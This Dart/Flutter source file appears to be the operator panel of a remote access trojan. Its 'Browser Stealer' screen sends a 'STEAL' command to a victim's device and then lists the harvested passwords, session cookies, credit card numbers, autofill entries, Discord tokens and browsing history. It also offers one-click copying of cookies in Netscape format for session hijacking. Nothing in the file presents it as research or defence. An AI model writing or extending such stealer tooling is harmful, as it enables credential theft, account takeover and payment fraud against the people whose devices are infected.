import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:url_launcher/url_launcher.dart';
import 'api_service.dart';

// ============================================================
// GRID PATTERN PAINTER
// ============================================================
class _StealerGridPatternPainter extends CustomPainter {
  final Color gridColor;
  final double spacing;
  
  const _StealerGridPatternPainter({
    required this.gridColor,
    this.spacing = 25,
  });
  
  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = gridColor
      ..style = PaintingStyle.stroke
      ..strokeWidth = 0.6;
    
    for (double x = 0; x < size.width; x += spacing) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), paint);
    }
    
    for (double y = 0; y < size.height; y += spacing) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), paint);
    }
  }
  
  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}

// ── Palette ───────────────────────────────────────────────────────────────────
const _kBg      = Color(0xFF111827);
const _kCard    = Color(0xFF1F2937);
const _kBlue    = Color(0xFF3B82F6);
const _kCyan    = Color(0xFF06B6D4);
const _kAmber   = Color(0xFFF59E0B);
const _kSub     = Color(0xFF9CA3AF);

class StealerScreen extends StatefulWidget {
  final String deviceId;
  final String sessionKey;
  const StealerScreen({super.key, required this.deviceId, required this.sessionKey});

  @override
  State<StealerScreen> createState() => _StealerScreenState();
}

class _StealerScreenState extends State<StealerScreen> with SingleTickerProviderStateMixin {
  Map<String, List<dynamic>> _data = {};
  List<dynamic> _files = [];
  late TabController _tabController;
  final _search = TextEditingController();
  bool _isLoading = true;

  @override
  void initState() {
    super.initState();
    _tabController = TabController(length: 6, vsync: this);
    _fetch();
    _search.addListener(_onSearch);
  }

  @override
  void dispose() { 
    _tabController.dispose();
    _search.dispose(); 
    super.dispose(); 
  }

  void _onSearch() {
    setState(() {});
  }

  Future<void> _fetch() async {
    setState(() => _isLoading = true);
    try {
      final api = RatApiService(widget.sessionKey);
      
      final map = await api.getStealer(widget.deviceId);
      if (mounted) {
        setState(() {
          _data = {
            'passwords': List.from(map['passwords'] ?? []),
            'cookies': List.from(map['cookies'] ?? []),
            'cards': List.from(map['cards'] ?? []),
            'autofill': List.from(map['autofill'] ?? []),
            'discord': List.from(map['discord'] ?? []),
            'browsing': List.from(map['history'] ?? []),
          };
        });
      }
    } catch (e) {
      _snack('Error: $e');
    } finally {
      if (mounted) setState(() => _isLoading = false);
    }
  }

  Future<void> _triggerSteal() async {
    try {
      await RatApiService(widget.sessionKey).sendCommand(widget.deviceId, 'STEAL');
      _snack('STEAL command sent. Waiting for upload...');
      await Future.delayed(const Duration(seconds: 5));
      await _fetch();
    } catch (e) { _snack('Error: $e'); }
  }

  void _snack(String msg) => ScaffoldMessenger.of(context).showSnackBar(
    SnackBar(content: Text(msg), backgroundColor: _kCard,
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
      margin: const EdgeInsets.all(16)),
  );

  List<dynamic> _getFiltered(String category) {
    final list = _data[category] ?? [];
    final q = _search.text.toLowerCase();
    if (q.isEmpty) return list;
    return list.where((item) {
       final str = item.toString().toLowerCase();
       return str.contains(q);
    }).toList();
  }

  Widget _buildGridBackground() {
    return Positioned.fill(
      child: CustomPaint(
        painter: _StealerGridPatternPainter(
          gridColor: Colors.white.withOpacity(0.03),
          spacing: 30,
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        children: [
          _buildGridBackground(),
          Container(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [
                  Colors.black.withOpacity(0.85),
                  _kBlue.withOpacity(0.05),
                  Colors.black.withOpacity(0.9)
                ],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
            ),
          ),
          SafeArea(
            child: Column(children: [
              // Header
              Padding(
                padding: const EdgeInsets.fromLTRB(16, 16, 16, 0),
                child: Row(children: [
                  GestureDetector(
                    onTap: () => Navigator.pop(context),
                    child: Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: Colors.white.withOpacity(0.05),
                        borderRadius: BorderRadius.circular(10),
                        border: Border.all(color: Colors.white12),
                      ),
                      child: const Icon(Icons.arrow_back_ios_rounded, color: Colors.white70, size: 16),
                    ),
                  ),
                  const SizedBox(width: 12),
                  const Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                    Text('Browser Stealer', style: TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.w700)),
                    Text('Captured credentials & data', style: TextStyle(color: _kSub, fontSize: 12)),
                  ])),
                  GestureDetector(
                    onTap: _triggerSteal,
                    child: Container(
                      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                      decoration: BoxDecoration(
                        gradient: const LinearGradient(colors: [_kBlue, _kCyan]),
                        borderRadius: BorderRadius.circular(10),
                      ),
                      child: const Row(children: [
                        Icon(Icons.refresh_rounded, color: Colors.white, size: 16),
                        SizedBox(width: 4),
                        Text('Steal', style: TextStyle(color: Colors.white, fontSize: 12, fontWeight: FontWeight.w600)),
                      ]),
                    ),
                  ),
                ]),
              ),
              
              // Search
              Padding(
                padding: const EdgeInsets.fromLTRB(16, 12, 16, 0),
                child: TextField(
                  controller: _search,
                  style: const TextStyle(color: Colors.white, fontSize: 14),
                  decoration: InputDecoration(
                    hintText: 'Search data...',
                    hintStyle: TextStyle(color: Colors.white.withOpacity(0.3)),
                    filled: true, fillColor: _kCard.withOpacity(0.8),
                    contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 13),
                    border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none),
                    prefixIcon: const Icon(Icons.search_rounded, color: _kSub, size: 20),
                  ),
                ),
              ),

              // Tabs
              TabBar(
                controller: _tabController,
                isScrollable: true,
                indicatorColor: _kBlue,
                labelColor: _kBlue,
                unselectedLabelColor: _kSub,
                tabs: const [
                  Tab(text: 'Passwords'),
                  Tab(text: 'Cookies'),
                  Tab(text: 'Cards'),
                  Tab(text: 'Autofill'),
                  Tab(text: 'Discord'),
                  Tab(text: 'Browsing'),
                ],
              ),

              // Tab Views
              Expanded(
                child: _isLoading
                  ? const Center(child: CircularProgressIndicator(color: _kBlue, strokeWidth: 2))
                  : TabBarView(
                      controller: _tabController,
                      children: [
                        _buildListView('passwords'),
                        _buildListView('cookies'),
                        _buildListView('cards'),
                        _buildListView('autofill'),
                        _buildListView('discord'),
                        _buildListView('browsing'),
                      ],
                    ),
              ),
            ]),
          ),
        ],
      ),
    );
  }

  Widget _buildListView(String category) {
    final list = _getFiltered(category);
    if (list.isEmpty) {
       return Center(child: Text('No $category found', style: const TextStyle(color: _kSub)));
    }
    return ListView.builder(
      padding: const EdgeInsets.all(16),
      itemCount: list.length,
      itemBuilder: (_, i) => _buildCard(category, list[i]),
    );
  }

  Widget _buildCard(String category, dynamic data) {
    String title = "";
    String desc = "";
    IconData icon = Icons.data_usage_rounded;
    Color iconColor = _kBlue;

    if (category == 'passwords') {
      title = "Link: ${data['url'] ?? 'Unknown URL'}";
      desc = "Username: ${data['username'] ?? '—'}";
      icon = Icons.key_rounded;
    } else if (category == 'cookies') {
      title = "Link: ${data['host'] ?? 'Unknown Host'}";
      desc = "Cookies";
      icon = Icons.cookie_rounded;
      if (data['status']?.contains('LOCKED') ?? false) iconColor = Colors.redAccent;
    } else if (category == 'cards') {
      title = "Link: ${data['number'] ?? '**** **** ****'}";
      desc = "Cardholder: ${data['name'] ?? '—'}";
      icon = Icons.credit_card_rounded;
    } else if (category == 'discord') {
      title = "Title: Discord (${data['username'] ?? 'Token'})";
      desc = "Desc: ${data['email'] ?? '—'}";
      icon = Icons.discord;
    } else if (category == 'browsing') {
      title = "Link: ${data['url'] ?? 'Visited Link'}";
      desc = "Visits: ${data['visits'] ?? '1'}";
      icon = Icons.history_rounded;
    } else {
      title = "Title: ${data['name'] ?? 'Data'}";
      desc = "Desc: ${data['value'] ?? ''}";
    }

    return Container(
      margin: const EdgeInsets.only(bottom: 12),
      decoration: BoxDecoration(
        color: _kCard.withOpacity(0.95),
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: iconColor.withOpacity(0.25), width: 1),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.3),
            blurRadius: 10,
            offset: const Offset(0, 4),
          )
        ],
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(16),
        child: ExpansionTile(
          backgroundColor: Colors.white.withOpacity(0.02),
          collapsedBackgroundColor: Colors.transparent,
          leading: Container(
            padding: const EdgeInsets.all(8),
            decoration: BoxDecoration(
              color: iconColor.withOpacity(0.1),
              borderRadius: BorderRadius.circular(10),
            ),
            child: Icon(icon, color: iconColor, size: 20),
          ),
          title: Text(
            title,
            style: const TextStyle(
              color: Colors.white,
              fontSize: 13,
              fontWeight: FontWeight.w700,
              letterSpacing: 0.5,
            ),
            maxLines: 1,
            overflow: TextOverflow.ellipsis,
          ),
          subtitle: Text(
            desc,
            style: TextStyle(
              color: _kSub.withOpacity(0.7),
              fontSize: 11,
            ),
          ),
          iconColor: iconColor,
          collapsedIconColor: _kSub,
          children: [
            Padding(
              padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Divider(color: Colors.white10),
                  const SizedBox(height: 8),
                  ...(data as Map<String, dynamic>).entries.map((e) {
                    if (e.key == 'raw_netscape' || e.key == 'value') return const SizedBox();
                    return _row(e.key.toUpperCase(), e.value.toString());
                  }).toList(),
                  if (category == 'cookies') ...[
                    const SizedBox(height: 12),
                    ElevatedButton.icon(
                      onPressed: () {
                        String cookieStr = data['raw_netscape'] ?? data['value'] ?? data.toString();
                        Clipboard.setData(ClipboardData(text: cookieStr));
                        _snack('Cookie data copied to clipboard');
                      },
                      icon: const Icon(Icons.copy_rounded, size: 16),
                      label: const Text("Copy Cookie Data"),
                      style: ElevatedButton.styleFrom(
                        backgroundColor: _kBlue,
                        foregroundColor: Colors.white,
                        minimumSize: const Size(double.infinity, 40),
                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
                      ),
                    ),
                  ],
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _row(String label, String value, {bool canCopy = true}) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(children: [
        SizedBox(width: 80, child: Text(label, style: const TextStyle(color: _kSub, fontSize: 10))),
        Expanded(child: Text(value, style: const TextStyle(color: Colors.white, fontSize: 12))),
        if (canCopy) IconButton(
          icon: const Icon(Icons.copy_rounded, size: 14, color: _kBlue),
          onPressed: () { Clipboard.setData(ClipboardData(text: value)); _snack('Copied $label'); },
        )
      ]),
    );
  }
}